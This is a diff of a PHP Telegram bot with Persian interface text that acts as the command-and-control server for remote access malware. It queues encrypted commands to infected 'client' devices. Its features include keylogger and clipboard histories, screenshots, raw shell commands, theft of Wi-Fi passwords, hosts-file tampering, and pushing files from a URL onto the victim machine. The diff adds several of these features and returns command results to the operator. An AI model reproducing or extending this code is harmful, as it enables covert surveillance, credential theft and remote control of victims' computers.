@@ -28,9 +28,16 @@ class TelegramHandler
         }
     }
 
-    private static function is_authorized($chat_id)
-    {
-        return $chat_id == Config::$ADMIN_CHAT_ID;
+    private static function is_authorized($chat_id) {
+        $pdo = new PDO(
+            "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
+            Config::$DB_USER,
+            Config::$DB_PASS,
+            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
+        );
+        $stmt = $pdo->prepare("SELECT chat_id FROM allowed_users WHERE chat_id = ?");
+        $stmt->execute([$chat_id]);
+        return $stmt->fetchColumn() !== false;
     }
 
     private static function process_message($pdo, $crypto, $message)
@@ -56,9 +63,49 @@ class TelegramHandler
                 case '/start':
                     self::show_client_list($pdo, $chat_id);
                     break;
-                case '/help': // اضافه کردن دستور help
+                case '/test_telegram':
+                    self::send_telegram_message($chat_id, "Test message from server");
+                    break;
+                case '/hosts':
+                    $parts = explode(' ', $text, 3);
+                    if (count($parts) < 2) {
+                        self::send_telegram_message($chat_id, "⚠️ فرمت: /hosts <list|add|remove> [ورودی]");
+                        break;
+                    }
+                    $action = $parts[1];
+                    $host_entry = $parts[2] ?? '';
+                    if ($action === 'list' || ($action === 'add' && $host_entry) || ($action === 'remove' && $host_entry)) {
+                        self::send_command($pdo, $crypto, $chat_id, 'edit_hosts', [
+                            'action' => $action,
+                            'host_entry' => $host_entry
+                        ]);
+                        self::send_telegram_message($chat_id, "⏳ در حال پردازش فایل hosts...");
+                    } else {
+                        self::send_telegram_message($chat_id, "⚠️ فرمت نامعتبر!");
+                    }
+                    break;
+                case '/upload_url':
+                    $parts = explode(' ', $text, 3);
+                    if (count($parts) < 3) {
+                        self::send_telegram_message($chat_id, "⚠️ فرمت: /upload_url <URL> <مسیر مقصد>");
+                        break;
+                    }
+                    $file_url = $parts[1];
+                    $dest_path = $parts[2];
+                    self::send_command($pdo, $crypto, $chat_id, 'upload_file', [
+                        'source' => 'url',
+                        'file_url' => $file_url,
+                        'dest_path' => $dest_path
+                    ]);
+                    self::send_telegram_message($chat_id, "⏳ در حال آپلود فایل از URL...");
+                    break;
+
+                case '/upload_file':
+                    self::send_telegram_message($chat_id, "📎 لطفا فایل را آپلود کنید و مسیر مقصد را به فرمت زیر بنویسید:\n/upload_file_dest <مسیر مقصد>");
+                    break;
+                case '/help':
                     self::show_help_menu($chat_id);
-                    break;            
+                    break;
                 case '/cmd':
                     self::send_telegram_message($chat_id, "⚠️ از فرمت زیر استفاده کنید:\n/cmd <دستور>");
                     break;
@@ -94,12 +141,43 @@ class TelegramHandler
                     self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                     break;
                 default:
-                    if (strpos($text, '/cmd ') === 0) {
-                        self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => substr($text, 5)]);
-                    } elseif (strpos($text, '/go ') === 0) {
-                        self::send_command($pdo, $crypto, $chat_id, 'open_url', ['url' => substr($text, 4)]);
+                    if (isset($message['document'])) {
+                        $file_id = $message['document']['file_id'];
+                        $stmt = $pdo->prepare("INSERT INTO pending_uploads (chat_id, file_id) VALUES (?, ?)");
+                        $stmt->execute([$chat_id, $file_id]);
+                        self::send_telegram_message($chat_id, "📎 فایل دریافت شد. لطفا مسیر مقصد را با /upload_file_dest <مسیر> مشخص کنید.");
+                    } elseif (strpos($text, '/upload_file_dest') === 0) {
+                        $parts = explode(' ', $text, 2);
+                        if (count($parts) < 2) {
+                            self::send_telegram_message($chat_id, "⚠️ فرمت: /upload_file_dest <مسیر مقصد>");
+                            break;
+                        }
+                        $dest_path = $parts[1];
+                        $stmt = $pdo->prepare("SELECT file_id FROM pending_uploads WHERE chat_id = ? ORDER BY created_at DESC LIMIT 1");
+                        $stmt->execute([$chat_id]);
+                        $file_id = $stmt->fetchColumn();
+                        if ($file_id) {
+                            self::send_command($pdo, $crypto, $chat_id, 'upload_file', [
+                                'source' => 'telegram',
+                                'file_url' => $file_id,
+                                'dest_path' => $dest_path
+                            ]);
+                            self::send_telegram_message($chat_id, "⏳ در حال آپلود فایل از تلگرام...");
+                            $stmt = $pdo->prepare("DELETE FROM pending_uploads WHERE chat_id = ? AND file_id = ?");
+                            $stmt->execute([$chat_id, $file_id]);
+                        } else {
+                            self::send_telegram_message($chat_id, "⚠️ ابتدا فایل را آپلود کنید!");
+                        }
+                    } elseif (strpos($text, '/cmd') === 0) {
+                        $command = trim(substr($text, 4));
+                        if (!empty($command)) {
+                            self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => $command]);
+                            self::send_telegram_message($chat_id, "⏳ در حال اجرای دستور...");
+                        } else {
+                            self::send_telegram_message($chat_id, "⚠️ دستور خالی است!");
+                        }
                     } else {
-                        self::send_telegram_message($chat_id, "Unknown command. Use /start to begin.");
+                        self::send_telegram_message($chat_id, "⚠️ دستور ناشناخته! از /start استفاده کنید.");
                     }
             }
         } catch (Exception $e) {
@@ -108,26 +186,26 @@ class TelegramHandler
         }
     }
 
-    private static function show_help_menu($chat_id) {
-        $help_text = "🎮 **راهنمای دستورات**\n\n"
-            ."🔍 `/start` - نمایش لیست دستگاهها\n"
-            ."📂 `/browse` - مرور فایلهای دستگاه\n"
-            ."🌐 `/go <URL>` - باز کردن آدرس اینترنتی\n"
-            ."💻 `/cmd <command>` - اجرای دستور مستقیم\n"
-            ."📸 `/screens` - مشاهده اسکرین‌شاتها\n"
-            ."📝 `/logs` - مشاهده لاگهای خطا\n"
-            ."⚙️ `/get-info` - اطلاعات سیستم\n"
-            ."🔌 `/shutdown` - خاموش کردن دستگاه\n"
-            ."🔄 `/restart` - راه‌اندازی مجدد\n"
-            ."❓ `/help` - نمایش این راهنما";
-    
+    private static function show_help_menu($chat_id)
+    {
+        $help_text = "🎮 <b>راهنمای دستورات</b>\n\n"
+            . "🔍 <code>/start</code> - نمایش لیست دستگاهها\n"
+            . "📂 <code>/browse</code> - مرور فایلهای دستگاه\n"
+            . "🌐 <code>/go &lt;URL&gt;</code> - باز کردن آدرس اینترنتی\n"
+            . "💻 <code>/cmd &lt;command&gt;</code> - اجرای دستور مستقیم\n"
+            . "📸 <code>/screens</code> - مشاهده اسکرین‌شاتها\n"
+            . "📝 <code>/logs</code> - مشاهده لاگهای خطا\n"
+            . "⚙️ <code>/get-info</code> - اطلاعات سیستم\n"
+            . "🔌 <code>/shutdown</code> - خاموش کردن دستگاه\n"
+            . "🔄 <code>/restart</code> - راه‌اندازی مجدد\n"
+            . "❓ <code>/help</code> - نمایش این راهنما";
+
         self::send_telegram_message(
             $chat_id,
             $help_text,
-            ['parse_mode' => 'Markdown']
+            ['parse_mode' => 'HTML']
         );
     }
-    
 
     private static function process_callback($pdo, $crypto, $callback)
     {
@@ -136,13 +214,11 @@ class TelegramHandler
             $data = $callback['data'];
             $message_id = $callback['message']['message_id'] ?? null;
 
-            // دریافت client_id انتخابی کاربر
             $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
             $stmt->execute([$chat_id]);
             $selected_client = $stmt->fetch(PDO::FETCH_ASSOC);
             $client_id = $selected_client['selected_client_id'] ?? null;
 
-            // پردازش انواع callback_data
             if (strpos($data, 'select_client:') === 0) {
                 $client_id = substr($data, 14);
                 $stmt = $pdo->prepare("UPDATE allowed_users SET selected_client_id = ? WHERE chat_id = ?");
@@ -152,9 +228,10 @@ class TelegramHandler
                 $client_id = substr($data, 14);
                 self::send_telegram_message(
                     $chat_id,
-                    "🔧 لطفا دستور مورد نظر را به فرمت زیر ارسال کنید:\n/cmd <دستور>",
-                    ['parse_mode' => 'Markdown']
+                    "✅ دستگاه انتخاب شد: " . $client_id,
+                    ['reply_markup' => json_encode(['remove_keyboard' => true])]
                 );
+                self::show_access_menu($pdo, $chat_id, $client_id);
             } elseif (strpos($data, 'action:') === 0) {
                 $parts = explode(':', $data);
                 $action = $parts[1] ?? null;
@@ -186,6 +263,26 @@ class TelegramHandler
                         'text' => "در حال راه‌اندازی مجدد دستگاه...",
                         'params' => ['command' => 'restart']
                     ],
+                    'sleep' => [
+                        'type' => 'system_command',
+                        'text' => "در حال قرار دادن دستگاه در حالت خواب...",
+                        'params' => ['command' => 'sleep']
+                    ],
+                    'signout' => [
+                        'type' => 'system_command',
+                        'text' => "در حال خروج از حساب کاربری...",
+                        'params' => ['command' => 'signout']
+                    ],
+                    'get_wifi_passwords' => [
+                        'type' => 'wifi_passwords',
+                        'text' => "در حال دریافت رمزهای وای‌فای...",
+                        'params' => []
+                    ],
+                    'edit_hosts' => [
+                        'type' => 'edit_hosts',
+                        'text' => "لطفا اقدام و ورودی را وارد کنید (مثال: /hosts add 127.0.0.1 example.com یا /hosts list)",
+                        'params' => []
+                    ],
                     'clipboard' => [
                         'type' => 'clipboard_history',
                         'text' => "در حال دریافت تاریخچه کلیپبورد...",
@@ -210,21 +307,24 @@ class TelegramHandler
                         'type' => 'open_url',
                         'text' => "لطفا URL را وارد کنید:",
                         'params' => []
+                    ],
+                    'upload_file' => [
+                        'type' => 'upload_file',
+                        'text' => "لطفا فایل یا URL را آپلود کنید...",
+                        'params' => []
                     ]
                 ];
 
                 if ($action && array_key_exists($action, $actions)) {
-                    // نمایش پیام وضعیت
                     self::send_telegram_message($chat_id, "⏳ " . $actions[$action]['text']);
-
-                    // ارسال دستور به کلاینت
-                    self::send_command(
-                        $pdo,
-                        $crypto,
-                        $chat_id,
-                        $actions[$action]['type'],
-                        array_merge($actions[$action]['params'], ['client_id' => $client_id])
-                    );
+                    $stmt = $pdo->prepare("
+                        INSERT INTO commands (client_id, command, status, created_at)
+                        VALUES (?, ?, 'pending', NOW())
+                    ");
+                    $command_data = ['type' => $actions[$action]['type'], 'params' => array_merge($actions[$action]['params'], ['client_id' => $client_id])];
+                    $stmt->execute([$client_id, $crypto->encrypt(json_encode($command_data))]);
+                    $command_id = $pdo->lastInsertId();
+                    self::poll_for_command_result($pdo, $chat_id, $command_id);
                 } else {
                     self::send_telegram_message($chat_id, "⚠️ دستور نامعتبر!");
                 }
@@ -234,12 +334,13 @@ class TelegramHandler
             } elseif ($data === 'view_clipboard_logs') {
                 if ($client_id) {
                     self::show_clipboard_history($pdo, $chat_id, $client_id);
+                } else {
+                    self::send_telegram_message($chat_id, "⚠️ دستگاه انتخاب نشده!");
                 }
             } else {
                 self::send_telegram_message($chat_id, "⚠️ دستور نامشخص!");
             }
 
-            // حذف پیام قبلی برای تجربه کاربری بهتر
             if ($message_id) {
                 self::delete_telegram_message($chat_id, $message_id);
             }
@@ -249,7 +350,31 @@ class TelegramHandler
         }
     }
 
-    // تابع کمکی برای حذف پیام
+    private static function poll_for_command_result($pdo, $chat_id, $command_id)
+    {
+        $max_attempts = 10;
+        $attempt = 0;
+        $sleep_interval = 3; // ثانیه
+
+        while ($attempt < $max_attempts) {
+            $stmt = $pdo->prepare("SELECT response, status FROM commands WHERE id = ?");
+            $stmt->execute([$command_id]);
+            $command = $stmt->fetch(PDO::FETCH_ASSOC);
+
+            if ($command && $command['status'] === 'completed' && $command['response']) {
+                $result = json_decode($command['response'], true);
+                $message = "Command #$command_id executed:\n<pre>" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . "</pre>";
+                self::send_telegram_message($chat_id, $message, ['parse_mode' => 'HTML']);
+                return;
+            }
+
+            $attempt++;
+            sleep($sleep_interval);
+        }
+
+        self::send_telegram_message($chat_id, "⚠️ Timeout waiting for command result!");
+    }
+
     private static function delete_telegram_message($chat_id, $message_id)
     {
         try {
@@ -311,7 +436,6 @@ class TelegramHandler
                 ]];
             }
 
-            // افزودن دکمه مشاهده لاگ‌های کلیپبورد
             $keyboard['inline_keyboard'][] = [[
                 'text' => "📋 مشاهده کلیپبوردهای ذخیره شده",
                 'callback_data' => 'view_clipboard_logs'
@@ -384,41 +508,30 @@ class TelegramHandler
 
     private static function show_access_menu($pdo, $chat_id, $client_id)
     {
-        try {
-            $keyboard = [
-                'inline_keyboard' => [
-                    [
-                        ['text' => "📊 اطلاعات سیستم", 'callback_data' => 'action:get_info:' . $client_id],
-                        ['text' => "📂 مدیریت فایل‌ها", 'callback_data' => 'action:file_manager:' . $client_id]
-                    ],
-                    [
-                        ['text' => "⌨️ تاریخچه کیلاگر", 'callback_data' => 'action:keystrokes:' . $client_id],
-                        ['text' => "📋 تاریخچه کلیپبورد", 'callback_data' => 'action:clipboard:' . $client_id]
-                    ],
-                    [
-                        ['text' => "🖥️ مدیریت پردازش‌ها", 'callback_data' => 'action:process_mgmt:' . $client_id],
-                        ['text' => "🌐 بازکردن URL", 'callback_data' => 'action:open_url:' . $client_id]
-                    ],
-                    [
-                        ['text' => "🛑 خاموش کردن", 'callback_data' => 'action:shutdown:' . $client_id],
-                        ['text' => "🔄 راه‌اندازی مجدد", 'callback_data' => 'action:restart:' . $client_id]
-                    ],
-                    [
-                        ['text' => "📸 اسکرین‌شات جدید", 'callback_data' => 'action:screenshot:' . $client_id],
-                        ['text' => "📝 اجرای دستور", 'callback_data' => 'action:raw_cmd:' . $client_id]
-                    ]
-                ]
-            ];
-
-            self::send_telegram_message(
-                $chat_id,
-                "🎮 **کنترل کامل دستگاه**\n\n🆔 شناسه دستگاه: `{$client_id}`\nانتخاب عملیات:",
-                ['reply_markup' => $keyboard, 'parse_mode' => 'Markdown']
-            );
-        } catch (Exception $e) {
-            Utils::log_error("Error in show_access_menu: " . $e->getMessage());
-            self::send_telegram_message($chat_id, "⚠️ خطا در نمایش منوی دستورات");
-        }
+        $keyboard = [
+            'inline_keyboard' => [
+                [['text' => 'ℹ️ اطلاعات سیستم', 'callback_data' => "action:get_info:{$client_id}"]],
+                [['text' => '📁 مرور فایل‌ها', 'callback_data' => "action:browse:{$client_id}"]],
+                [['text' => '📸 اسکرین‌شات', 'callback_data' => "action:screenshot:{$client_id}"]],
+                [['text' => '📋 کلیپبورد', 'callback_data' => "action:clipboard:{$client_id}"]],
+                [['text' => '⌨️ کیلاگر', 'callback_data' => "action:keystrokes:{$client_id}"]],
+                [['text' => '🖥️ پردازش‌ها', 'callback_data' => "action:process_mgmt:{$client_id}"]],
+                [['text' => '🔗 باز کردن URL', 'callback_data' => "action:open_url:{$client_id}"]],
+                [['text' => '📡 رمزهای وای‌فای', 'callback_data' => "action:get_wifi_passwords:{$client_id}"]],
+                [['text' => '📝 ویرایش فایل hosts', 'callback_data' => "action:edit_hosts:{$client_id}"]],
+                [['text' => '📤 آپلود فایل', 'callback_data' => "action:upload_file:{$client_id}"]],
+                [['text' => '🔧 دستور خام', 'callback_data' => "action:raw_cmd:{$client_id}"]],
+                [['text' => '🔌 خاموش کردن', 'callback_data' => "action:shutdown:{$client_id}"]],
+                [['text' => '🔄 راه‌اندازی مجدد', 'callback_data' => "action:restart:{$client_id}"]],
+                [['text' => '😴 حالت خواب', 'callback_data' => "action:sleep:{$client_id}"]],
+                [['text' => '🚪 خروج', 'callback_data' => "action:signout:{$client_id}"]],
+                [['text' => '📜 داده‌های قدیمی', 'callback_data' => "view_old_data:{$client_id}"]],
+                [['text' => '📋 لاگ کلیپبورد', 'callback_data' => 'view_clipboard_logs']]
+            ]
+        ];
+        self::send_telegram_message($chat_id, "📋 منوی دسترسی برای دستگاه {$client_id}:", [
+            'reply_markup' => json_encode($keyboard)
+        ]);
     }
 
     private static function show_keystroke_history($pdo, $chat_id, $client_id)
@@ -490,34 +603,32 @@ class TelegramHandler
         }
     }
 
-    private static function send_command($pdo, $crypto, $chat_id, $type, $params)
-    {
-        try {
-            $client_id = $params['client_id'] ?? null;
+private static function send_command($pdo, $crypto, $chat_id, $type, $params) {
+    try {
+        $client_id = Utils::sanitize_input($params['client_id'] ?? '');
+        if (!$client_id) {
+            $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
+            $stmt->execute([$chat_id]);
+            $client_id = $stmt->fetchColumn();
             if (!$client_id) {
-                $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
-                $stmt->execute([$chat_id]);
-                $client_id = $stmt->fetchColumn();
-                if (!$client_id) {
-                    self::send_telegram_message($chat_id, "No client selected. Please select a client first using /start.");
-                    return;
-                }
+                self::send_telegram_message($chat_id, "No client selected. Please select a client first using /start.");
+                return;
             }
-            $client_id = Utils::sanitize_input($client_id);
-            $command = ['type' => $type, 'params' => $params];
-
-            $stmt = $pdo->prepare("
-                INSERT INTO commands (client_id, command, status, created_at)
-                VALUES (?, ?, 'pending', NOW())
-            ");
-            $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);
-
-            self::send_telegram_message($chat_id, "Command sent to client $client_id.");
-        } catch (Exception $e) {
-            Utils::log_error("Error in send_command: " . $e->getMessage());
-            self::send_telegram_message($chat_id, "An error occurred while sending the command.");
         }
+        $command = ['type' => $type, 'params' => $params];
+        $stmt = $pdo->prepare("
+            INSERT INTO commands (client_id, command, status, created_at)
+            VALUES (?, ?, 'pending', NOW())
+        ");
+        $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);
+        $command_id = $pdo->lastInsertId();
+        self::send_telegram_message($chat_id, "Command sent to client $client_id (ID: $command_id).");
+        self::poll_for_command_result($pdo, $chat_id, $command_id);
+    } catch (Exception $e) {
+        Utils::log_error("Error in send_command: " . $e->getMessage());
+        self::send_telegram_message($chat_id, "An error occurred while sending the command: " . $e->getMessage());
     }
+}
 
     private static function handle_file_upload($pdo, $crypto, $message)
     {
@@ -585,9 +696,19 @@ class TelegramHandler
                 CURLOPT_TIMEOUT => Config::$COMMAND_TIMEOUT
             ]);
             $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
             curl_close($ch);
+
+            if ($http_code !== 200) {
+                Utils::log_error("Telegram API error: HTTP $http_code, Response: $response");
+            } else {
+                Utils::log_update(['response' => $response], "Telegram message sent to chat_id: $chat_id");
+            }
+
+            return $response;
         } catch (Exception $e) {
             Utils::log_error("Error in send_telegram_message: " . $e->getMessage());
+            return false;
         }
     }
 
